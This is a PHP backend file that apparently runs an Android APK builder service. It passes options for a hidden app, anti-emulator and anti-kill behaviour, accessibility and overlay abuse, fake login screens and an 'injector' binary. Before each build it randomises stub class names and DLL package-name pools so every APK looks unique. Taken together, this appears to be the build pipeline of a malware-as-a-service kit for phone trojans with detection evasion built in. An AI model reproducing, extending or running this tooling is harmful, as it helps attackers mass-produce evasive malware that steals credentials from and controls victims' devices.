<?php
//this to run VB.net app , to start build apk
if (PHP_OS_FAMILY !== 'Windows') {
    putenv('JAVA_TOOL_OPTIONS=-Xmx4g');
}

function isBuilderEnabled(): bool
{
    return defined('ENABLE_BUILDER') && strtolower((string) ENABLE_BUILDER) === 'true';
}

function getStarterBinaryPath(): string
{
    if (PHP_OS_FAMILY === 'Windows') {
        return __DIR__ . DIRECTORY_SEPARATOR . 'EaodStarter.exe';
    }
    return __DIR__ . DIRECTORY_SEPARATOR . 'EaodStarter';
}

function canRunBuilder(string $binaryPath): bool
{
    return isBuilderEnabled() && is_file($binaryPath);
}

/* =========================================================
 * 构建日志辅助 (2025-04 新增)
 * 每次 BuildStore/BuildCustom 调用产生一份独立日志，记录每个阶段。
 * 日志路径: Eaod_logs/{userid}/build_{appid}_{YmdHis}_{rand}.log
 * ========================================================= */

/**
 * 创建本次构建的日志文件，返回 ['path' => ..., 'start_ts' => ...]
 */
function openBuildLog($userid, $appid): array
{
    $dir = __DIR__ . DIRECTORY_SEPARATOR . 'Eaod_logs' . DIRECTORY_SEPARATOR . $userid;
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    $safeAppid = preg_replace('/[^a-zA-Z0-9_.-]/', '_', (string) $appid);
    $ts = date('Ymd_His');
    $rand = substr(bin2hex(random_bytes(3)), 0, 6);
    $path = $dir . DIRECTORY_SEPARATOR . "build_{$safeAppid}_{$ts}_{$rand}.log";
    $startTs = microtime(true);

    $header = sprintf(
        "===============================================================\n" .
        " Build Log\n" .
        "   userid : %s\n" .
        "   appid  : %s\n" .
        "   started: %s\n" .
        "   pid    : %d\n" .
        "   os     : %s\n" .
        "===============================================================\n\n",
        $userid, $appid, date('Y-m-d H:i:s'), getmypid(), PHP_OS_FAMILY
    );
    @file_put_contents($path, $header);

    return ['path' => $path, 'start_ts' => $startTs];
}

/**
 * 写一行日志，自带时间戳和耗时（相对开始时间）。
 *
 * @param array  $log        openBuildLog() 返回的数组
 * @param string $phase      阶段名，例如 RANDOMIZE_START、EAODSTARTER_END
 * @param string $message    描述
 * @param string $level      INFO / WARN / ERROR
 */
function buildLog(array $log, string $phase, string $message = '', string $level = 'INFO'): void
{
    if (empty($log['path'])) return;
    $elapsed = (microtime(true) - ($log['start_ts'] ?? microtime(true))) * 1000;
    $line = sprintf("[%s] [%s] [%-22s] (+%7.1fms) %s\n",
        date('H:i:s'),
        $level,
        $phase,
        $elapsed,
        $message
    );
    @file_put_contents($log['path'], $line, FILE_APPEND);
}

/**
 * 在调 EaodStarter 之前调一次：把 apkstub_master.zip / apkstubg_master.zip
 * 重新随机化（类名）后输出成 apkstub.zip / apkstubg.zip。
 * EaodWorker 直接读 .zip，所以这两个 zip 是真正的"工作文件"。
 *
 * 用排他文件锁串行化，防止并发构建互相覆盖。
 *
 * 返回 [锁文件句柄, 摘要数组]，调用方在构建结束后必须 releaseApkStubLock($fp)。
 *
 * @throws RuntimeException 母版不存在 / Python 不可用 / 随机化失败
 */
function prepareRandomizedApkStub(?array $log = null): array
{
    $base       = __DIR__ . DIRECTORY_SEPARATOR . 'apkstub';
    $script     = __DIR__ . DIRECTORY_SEPARATOR . 'tools' . DIRECTORY_SEPARATOR . 'randomize_stub.py';
    $lockFile   = __DIR__ . DIRECTORY_SEPARATOR . '.apkstub.lock';

    // 两套 stub：apkstub.zip(ASKPRIM_all=1时用) 和 apkstubg.zip(其他)
    // 母版命名规则：<name>_master.zip
    $stubs = [
        'apkstub'  => [
            'master' => $base . DIRECTORY_SEPARATOR . 'apkstub_master.zip',
            'output' => $base . DIRECTORY_SEPARATOR . 'apkstub.zip',
        ],
        'apkstubg' => [
            'master' => $base . DIRECTORY_SEPARATOR . 'apkstubg_master.zip',
            'output' => $base . DIRECTORY_SEPARATOR . 'apkstubg.zip',
        ],
    ];

    if (!is_file($script)) {
        if ($log) buildLog($log, 'RANDOMIZE_FAIL', "randomize_stub.py not found: $script", 'ERROR');
        throw new RuntimeException("randomize_stub.py not found: $script");
    }

    // 拿排他锁（最多等 5 分钟）
    $fp = fopen($lockFile, 'c');
    if ($fp === false) {
        if ($log) buildLog($log, 'LOCK_FAIL', "Failed to open lock file", 'ERROR');
        throw new RuntimeException("Failed to open lock file: $lockFile");
    }
    if ($log) buildLog($log, 'LOCK_WAIT', "acquiring exclusive lock...");
    $start = time();
    $waited = 0;
    while (!flock($fp, LOCK_EX | LOCK_NB)) {
        if (time() - $start > 300) {
            fclose($fp);
            if ($log) buildLog($log, 'LOCK_FAIL', "lock timeout after 5min (another build running?)", 'ERROR');
            throw new RuntimeException("apkstub lock timeout after 5 minutes");
        }
        usleep(500000); // 0.5s
        $waited += 0.5;
    }
    if ($log) buildLog($log, 'LOCK_ACQUIRED', "after waiting {$waited}s");

    $python = (PHP_OS_FAMILY === 'Windows') ? 'python' : 'python3';
    $summaries = [];

    // 对每个存在的母版做随机化
    foreach ($stubs as $name => $cfg) {
        if (!is_file($cfg['master'])) {
            if ($log) buildLog($log, 'STUB_SKIP', "$name: master not found ({$cfg['master']})", 'WARN');
            continue;
        }
        $seed = (int) (microtime(true) * 1000 + crc32($name)) & 0x7fffffff;
        $cmd = escapeshellarg($python) . ' ' . escapeshellarg($script)
             . ' --src ' . escapeshellarg($cfg['master'])
             . ' --output-zip ' . escapeshellarg($cfg['output'])
             . ' --seed ' . (int) $seed
             . ' --quiet';

        if ($log) buildLog($log, 'STUB_RANDOMIZE_START', "$name  cmd=$cmd");

        $out = [];
        $ret = 0;
        exec($cmd . ' 2>&1', $out, $ret);

        if ($log) {
            foreach ($out as $line) {
                buildLog($log, 'PYTHON_OUT', "[$name] $line");
            }
        }

        if ($ret !== 0) {
            flock($fp, LOCK_UN);
            fclose($fp);
            if ($log) buildLog($log, 'STUB_RANDOMIZE_FAIL', "$name  exit_code=$ret", 'ERROR');
            throw new RuntimeException("randomize_stub.py for $name failed (code $ret): " . implode("\n", $out));
        }

        $summary = json_decode((string) end($out), true);
        $summaries[$name] = $summary ?: ['raw' => $out];
        if ($log) {
            $renamed = $summary['class_count_renamed'] ?? '?';
            $total   = $summary['class_count_total'] ?? '?';
            $size    = $summary['output_zip_size'] ?? 0;
            buildLog($log, 'STUB_RANDOMIZE_DONE', "$name  renamed=$renamed/$total  zipsize=$size");
        }
    }

    if (empty($summaries)) {
        flock($fp, LOCK_UN);
        fclose($fp);
        if ($log) buildLog($log, 'RANDOMIZE_FAIL', "no master zip found, did you backup?", 'ERROR');
        throw new RuntimeException("No master zip found in $base. Run: cp apkstub.zip apkstub_master.zip && cp apkstubg.zip apkstubg_master.zip");
    }

    // ---- 同样在锁内：刷新 EaodWorker.dll 的包名候选池 ----
    // 把 EaodWorker_master.dll 复制到 EaodWorker.dll 并把 118 个候选包名换成
    // 等长的随机伪包名。EaodStarter 启动后调用 EaodWorker.dll，读到的就是新池子。
    $dllScript  = __DIR__ . DIRECTORY_SEPARATOR . 'tools' . DIRECTORY_SEPARATOR . 'patch_dll_pkg.py';
    $dllMaster  = __DIR__ . DIRECTORY_SEPARATOR . 'EaodWorker_master.dll';
    $dllTarget  = __DIR__ . DIRECTORY_SEPARATOR . 'EaodWorker.dll';

    if (is_file($dllScript) && is_file($dllMaster)) {
        $dllSeed = (int) (microtime(true) * 1000 + getmypid()) & 0x7fffffff;
        $dllCmd = escapeshellarg($python) . ' ' . escapeshellarg($dllScript)
                . ' --src ' . escapeshellarg($dllMaster)
                . ' --dst ' . escapeshellarg($dllTarget)
                . ' --seed ' . (int) $dllSeed
                . ' --quiet';
        if ($log) buildLog($log, 'DLL_PATCH_START', "cmd=$dllCmd");
        $out = [];
        $ret = 0;
        exec($dllCmd . ' 2>&1', $out, $ret);
        if ($log) {
            foreach ($out as $line) {
                buildLog($log, 'PYTHON_OUT', "[dll] $line");
            }
        }
        if ($ret !== 0) {
            flock($fp, LOCK_UN);
            fclose($fp);
            if ($log) buildLog($log, 'DLL_PATCH_FAIL', "exit_code=$ret", 'ERROR');
            throw new RuntimeException("patch_dll_pkg.py failed (code $ret): " . implode("\n", $out));
        }
        $dllSummary = json_decode((string) end($out), true);
        $summaries['dll'] = $dllSummary ?: ['raw' => $out];
        if ($log) {
            $rep = $dllSummary['replaced'] ?? '?';
            $tot = $dllSummary['total'] ?? '?';
            buildLog($log, 'DLL_PATCH_DONE', "replaced=$rep/$tot");
        }
    } else {
        if ($log) {
            $reason = !is_file($dllScript) ? "script missing" : "master DLL missing";
            buildLog($log, 'DLL_PATCH_SKIP', $reason . " ($dllMaster)", 'WARN');
        }
    }

    return [$fp, $summaries];
}

/**
 * 释放 apkstub 锁。必须在构建完成（成功或失败）后调用。
 */
function releaseApkStubLock($fp, ?array $log = null): void
{
    if (is_resource($fp)) {
        @flock($fp, LOCK_UN);
        @fclose($fp);
        if ($log) buildLog($log, 'LOCK_RELEASED');
    }
}

function BuildStore(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $user_blackprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $installtype,
    $hide_type,
    $use_draw,
    $open_access,
    $descr_iption,
    $diao_type,
    $device_auth_token = ''
): string {
    $apkstubLockFp = null;
    $log = openBuildLog($userid, $appid);
    buildLog($log, 'BUILD_START', "BuildStore appname=$appname version=$appversion");
    try {
        $starterBinary = getStarterBinaryPath();
        if (!canRunBuilder($starterBinary)) {
            buildLog($log, 'BUILD_FAIL', "Builder disabled or binary missing: $starterBinary", 'ERROR');
            return Format("Builder disabled or not available on this server", OP_Fail);
        }

        // 清理旧日志，防止 EaodWorker JSON 写入污染导致后续构建失败
        $logDir = __DIR__ . '/Eaod_logs/' . $userid;
        if (is_dir($logDir)) {
            $todayLog = $logDir . '/' . date('Y-m-d') . '-log.json';
            if (file_exists($todayLog)) {
                @unlink($todayLog);
            }
        }

        // 在调 EaodStarter 前，把 apkstub_master/ 随机化后写入 apkstub/
        // 这样每个构建出的 APK 类名+包名都是独一无二的
        list($apkstubLockFp, $randomizeSummary) = prepareRandomizedApkStub($log);

        $output = [];
        $return_var = 0;


        $command = escapeshellarg($starterBinary) . " ";
        $command .= escapeshellarg("lunch") . " ";

        $arguments = [
            $appid,
            $userid,
            $clientname,
            $email,
            $mainActivity,
            $app_folder,
            $UserHost,
            $use_access,
            $use_antkill,
            $use_atoprims,
            $notifytitle,
            $notifymsg,
            $user_allprims,
            $user_blackprims,
            $buildtype,
            $appname,
            $appversion,
            $appicopath,
            $appurl,
            $logintitle,
            $logindis,
            $loginbtn,
            $lngshort,
            $hiddenapp,
            $noemulator,
            $installtype,
            $hide_type,
            $use_draw,
            $open_access,
            $descr_iption,
            $diao_type,
            $device_auth_token
        ];



        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }

        buildLog($log, 'EAODSTARTER_START', "binary=$starterBinary");

        if (PHP_OS_FAMILY !== 'Windows') {
            // Linux 异步：把 EaodStarter 输出直接写入构建日志
            $monitorScript = escapeshellarg(__DIR__ . '/build_monitor.php');
            $fullCmd = $command . " >> " . escapeshellarg($log['path']) . " 2>&1; php " . $monitorScript;
            exec("setsid bash -c " . escapeshellarg($fullCmd) . " &");
            buildLog($log, 'EAODSTARTER_BG', "started in background, log will append");
            usleep(500000);
            sleep(1);
            releaseApkStubLock($apkstubLockFp, $log);
            $apkstubLockFp = null;
            buildLog($log, 'BUILD_RETURN', "async path, EaodStarter still running");
            return Format('构建已启动', OP_Success);
        } else {
            exec($command, $output, $return_var);
        }

        // Windows 同步路径：把 EaodStarter 的所有输出抓进日志
        foreach ($output as $line) {
            buildLog($log, 'EAOD_OUT', $line);
        }
        buildLog($log, 'EAODSTARTER_END', "exit_code=$return_var");

        releaseApkStubLock($apkstubLockFp, $log);
        $apkstubLockFp = null;

        if ($return_var !== 0) {
            buildLog($log, 'BUILD_FAIL', "EaodStarter returned $return_var", 'ERROR');
            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            buildLog($log, 'BUILD_DONE', $output[0] ?? '构建已启动');
            return Format($output[0] ?? '构建已启动', OP_Success);
        }
    } catch (\Throwable $th) {
        // 异常路径也要释放锁
        if ($apkstubLockFp !== null) {
            releaseApkStubLock($apkstubLockFp, $log);
        }
        buildLog($log, 'BUILD_EXCEPTION', $th->getMessage() . "\n" . $th->getTraceAsString(), 'ERROR');
        logError($th);
        return Format("oops something went wrong1 , Please try again later", OP_Fail);
    }
}


function BuildCustom(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $user_blackprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $installtype,
    $hide_type,
    $use_draw,
    $open_access,
    $descr_iption,
    $diao_type,
    $device_auth_token = ''
): string {
    $apkstubLockFp = null;
    $log = openBuildLog($userid, $appid);
    buildLog($log, 'BUILD_START', "BuildCustom appname=$appname version=$appversion");
    try {
        $starterBinary = getStarterBinaryPath();
        if (!canRunBuilder($starterBinary)) {
            buildLog($log, 'BUILD_FAIL', "Builder disabled or binary missing: $starterBinary", 'ERROR');
            return Format("Builder disabled or not available on this server", OP_Fail);
        }

        // 清理旧日志，防止 EaodWorker JSON 写入污染导致后续构建失败
        $logDir = __DIR__ . '/Eaod_logs/' . $userid;
        if (is_dir($logDir)) {
            $todayLog = $logDir . '/' . date('Y-m-d') . '-log.json';
            if (file_exists($todayLog)) {
                @unlink($todayLog);
            }
        }

        // 在调 EaodStarter 前，把 apkstub_master/ 随机化后写入 apkstub/
        list($apkstubLockFp, $randomizeSummary) = prepareRandomizedApkStub($log);

        $output = [];
        $return_var = 0;


        $command = escapeshellarg($starterBinary) . " ";
        $command .= escapeshellarg("lunch") . " ";

        $arguments = [
            $appid,
            $userid,
            $clientname,
            $email,
            $mainActivity,
            $app_folder,
            $UserHost,
            $use_access,
            $use_antkill,
            $use_atoprims,
            $notifytitle,
            $notifymsg,
            $user_allprims,
            $user_blackprims,
            $buildtype,
            $appname,
            $appversion,
            $appicopath,
            $appurl,
            $logintitle,
            $logindis,
            $loginbtn,
            $lngshort,
            $hiddenapp,
            $noemulator,
            $installtype,
            $hide_type,
            $use_draw,
            $open_access,
            $descr_iption,
            $diao_type,
            $device_auth_token
        ];


        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }

        buildLog($log, 'EAODSTARTER_START', "binary=$starterBinary");

        if (PHP_OS_FAMILY !== 'Windows') {
            $monitorScript = escapeshellarg(__DIR__ . '/build_monitor.php');
            $fullCmd = $command . " >> " . escapeshellarg($log['path']) . " 2>&1; php " . $monitorScript;
            exec("setsid bash -c " . escapeshellarg($fullCmd) . " &");
            buildLog($log, 'EAODSTARTER_BG', "started in background, log will append");
            usleep(500000);
            sleep(1);
            releaseApkStubLock($apkstubLockFp, $log);
            $apkstubLockFp = null;
            buildLog($log, 'BUILD_RETURN', "async path, EaodStarter still running");
            return Format('构建已启动', OP_Success);
        } else {
            exec($command, $output, $return_var);
        }

        foreach ($output as $line) {
            buildLog($log, 'EAOD_OUT', $line);
        }
        buildLog($log, 'EAODSTARTER_END', "exit_code=$return_var");

        releaseApkStubLock($apkstubLockFp, $log);
        $apkstubLockFp = null;

        if ($return_var !== 0) {
            buildLog($log, 'BUILD_FAIL', "EaodStarter returned $return_var", 'ERROR');
            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            buildLog($log, 'BUILD_DONE', $output[0] ?? '构建已启动');
            return Format($output[0] ?? '构建已启动', OP_Success);
        }
    } catch (\Throwable $th) {
        if ($apkstubLockFp !== null) {
            releaseApkStubLock($apkstubLockFp, $log);
        }
        buildLog($log, 'BUILD_EXCEPTION', $th->getMessage() . "\n" . $th->getTraceAsString(), 'ERROR');
        logError($th);
        return Format("oops something went wrong2 , Please try again later", OP_Fail);
    }
}

function excutejector($arguments)
{
    try {
        if (!isBuilderEnabled()) {
            return Format("Jector disabled on this server", OP_Fail);
        }

        $output = [];
        $return_var = 0;


        $jectorBinary = __DIR__ . DIRECTORY_SEPARATOR . "jectorserver" . DIRECTORY_SEPARATOR . "jectorserver.exe";
        if (!is_file($jectorBinary)) {
            return Format("Jector binary not found", OP_Fail);
        }
        $command = escapeshellarg($jectorBinary);
        $command .= " ";

        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {

            if (!empty($output)) {
                return Format($output[0], OP_Success);
            } else {
                return Format("unkown jector response.", OP_Fail);
            }
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong3 , Please try again later", OP_Fail);
    }
}
